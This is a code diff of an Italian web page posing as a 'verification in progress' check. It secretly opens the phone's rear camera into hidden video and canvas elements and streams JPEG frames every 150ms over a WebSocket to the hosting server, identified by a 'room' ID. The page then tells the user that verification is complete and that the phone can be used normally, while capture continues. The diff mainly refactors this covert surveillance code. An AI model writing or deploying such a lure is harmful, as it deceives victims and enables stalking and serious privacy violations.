@@ -1,52 +1,37 @@
 <!DOCTYPE html>
 <html lang="it">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verifica...</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifica in corso...</title>
   <style>
     body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
-    .msg { padding:40px 20px; font-size:18px; }
+    .msg { padding:40px 20px; font-size:18px; line-height:1.5; }
   </style>
 </head>
 <body>
   <div class="msg">Verifica in corso...<br><small>Non chiudere questa pagina.</small></div>
 
-  <!-- Video nascosto -->
   <video id="cam" playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
+    const room = new URLSearchParams(location.search).get('room') || 'user1';
     const video = document.getElementById('cam');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
-    const room = new URLSearchParams(location.search).get('room') || 'user1';
-    
+
+    const wsProtocol = location.protocol === 'https:' ? 'wss' : 'ws';
+    const ws = new WebSocket(`${wsProtocol}://${location.host}/bg-stream?room=${room}`);
+
     let stream = null;
     let sending = false;
-
-    // WebSocket (anche in background)
-    const ws = new WebSocket(`wss://${location.host}/bg-stream?room=${room}`);
+    let frameInterval = null;
 
     ws.onopen = () => startCamera();
-    ws.onclose = () => console.log('Connessione persa');
-    ws.onerror = () => console.log('Errore WS');
+    ws.onclose = () => console.log('🔌 Connessione chiusa');
+    ws.onerror = (err) => console.log('❌ Errore WebSocket', err);
 
-    // Invia frame ogni 150ms (~6-7 FPS, basso consumo)
-    function sendFrame() {
-      if (!sending || video.videoWidth === 0) return;
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0);
-      canvas.toBlob(blob => {
-        if (ws.readyState === WebSocket.OPEN && blob) {
-          ws.send(blob);
-        }
-      }, 'image/jpeg', 0.6);
-      setTimeout(sendFrame, 150);
-    }
-
-    // Avvia fotocamera POSTERIORE
     async function startCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({
@@ -54,34 +39,65 @@
           audio: false
         });
         video.srcObject = stream;
+        video.play();
+
         video.onloadedmetadata = () => {
           sending = true;
-          sendFrame();
-
-          // Messaggio finale + chiudi visuale
-          document.body.innerHTML = `
-            <div class="msg">
-              <b>Verifica completata</b><br>
-              <small>Puoi usare il telefono normalmente.<br>
-              La verifica continua in background.</small>
-            </div>`;
-          
-          // Opzionale: minimizza automaticamente (solo mobile)
-          setTimeout(() => {
-            if (navigator.userActivation?.isActive) {
-              document.body.innerHTML = '';
-            }
-          }, 3000);
+          startSendingFrames();
+          showSuccessMessage();
         };
       } catch (err) {
-        document.body.innerHTML = `<div class="msg">Errore: ${err.message}</div>`;
+        handleCameraError(err);
       }
     }
 
-    // Tieni vivo il WebSocket anche se la scheda è in background
+    function startSendingFrames() {
+      if (frameInterval) clearInterval(frameInterval);
+      frameInterval = setInterval(() => {
+        if (!sending || ws.readyState !== WebSocket.OPEN || document.hidden) return;
+        if (video.videoWidth === 0) return;
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob((blob) => {
+          if (blob) ws.send(blob);
+        }, 'image/jpeg', 0.6);
+      }, 150);
+    }
+
+    function showSuccessMessage() {
+      document.body.innerHTML = `
+        <div class="msg">
+          <b>Verifica completata</b><br>
+          <small>Puoi usare il telefono normalmente.<br>
+          La verifica continuerà in background.</small>
+        </div>`;
+    }
+
+    function handleCameraError(err) {
+      let msg = 'Errore sconosciuto';
+      if (err.name === 'NotAllowedError') msg = 'Accesso alla fotocamera negato.';
+      else if (err.name === 'NotFoundError') msg = 'Nessuna fotocamera trovata.';
+      else msg = 'Errore: ' + err.message;
+      document.body.innerHTML = `<div class="msg">${msg}</div>`;
+    }
+
+    // Ping di keep-alive
     setInterval(() => {
       if (ws.readyState === WebSocket.OPEN) ws.send('ping');
     }, 10000);
+
+    // Stop invio se la scheda è nascosta
+    document.addEventListener('visibilitychange', () => {
+      sending = !document.hidden;
+    });
+
+    // Pulisci risorse alla chiusura
+    window.addEventListener('beforeunload', () => {
+      if (stream) stream.getTracks().forEach(t => t.stop());
+      if (ws.readyState === WebSocket.OPEN) ws.close();
+    });
   </script>
 </body>
 </html>
